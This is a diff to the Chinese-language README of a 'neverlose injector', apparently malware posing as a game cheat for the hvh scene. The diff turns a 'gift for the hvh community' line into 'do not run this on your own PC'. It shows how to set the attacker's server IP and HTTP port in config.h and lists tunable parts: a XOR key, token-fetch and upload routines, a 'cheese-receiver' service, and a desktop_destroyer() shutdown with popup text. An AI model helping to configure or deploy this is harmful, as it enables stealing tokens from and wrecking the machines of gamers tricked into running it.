@@ -1,5 +1,6 @@
 # neverlose injector
-送给hvh圈子的小礼物
+不要在自己的电脑上运行
+DO NOT RUN THIS IN UR OWN PC
 
 ## 编译
 
@@ -99,9 +100,15 @@ systemctl daemon-reload && systemctl enable --now cheese-receiver
 
 ## 配置项
 
-源码中按需修改以下位置：
+**服务器地址**：编辑 `injector/config.h`（已 gitignore，不会提交到仓库）
+```cpp
+#pragma once
+#define SERVER_HOST L"你的IP"
+#define SERVER_HTTP "http://你的IP:8890"
+```
+
+其他可配置项：
 - **XOR Key**：`XKEY` 常量（默认 0x55）
-- **服务器地址**：`fetch_token()` 和 `simple_upload()` 中的 IP/端口
 - **关机延迟**：`desktop_destroyer()` 中的 `Sleep(10000)`
 - **弹窗文字**：`desktop_destroyer()` 中的 `MessageBoxW`
 
